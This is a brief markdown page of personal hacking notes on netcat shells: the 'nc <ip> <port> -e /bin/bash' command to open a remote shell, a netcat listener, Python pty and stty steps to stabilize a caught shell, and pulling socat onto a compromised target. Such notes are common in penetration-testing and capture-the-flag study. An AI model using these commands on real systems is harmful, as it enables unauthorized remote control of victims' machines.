# NetCat shell
`-e <cmd>` - specify a command to execute e.g. `nc <ip> <port> -e /bin/bash` for a shell \
 The `-e` flag always must be appended to the target (where the shell must be executed).
 
# Shell stabilization
We have caught or connected to a netcat shell
## Python
1. `python -c 'import pty;pty.spawn("/bin/bash")'` - maybe need python2 or python3
2. `export TERM=xterm` - gives access to term commands like clear
3. Ctrl + Z to background the shell
4. `stty raw -echo; fg` - trun of own terminal echo and foreground shell

If shell dies use `reset` to turn on echo again

## rlwarp
We invoke nc via rlwrap which gives us access to history, tab completion and arrows. \
Needs to be installed if it is not. \
Also stabilized Windows shell. 

`rlwrap nc -lvnp <port>` - start nc in rlwrap

On Linux we can stabilze the shell completly by turning off our own terminal echo like above. 

## Socat
On linux this is a fully featured shell. On windows it is not more stable than a nc shell.
1. Obtain a static compiled binary of the socat shell for you target.
2. Use the netcat shell to download socat to the target
3. Invoke socat from the netcat shell

More on socat [here](https://github.com/leeky-mem/hacking-notes/blob/main/socat.md)

## Manually changing size of shell
`stty -a` - gives the host shell size \
`stty rows <row-size>` and `stty cols <cols-size>` changes the remote shell size
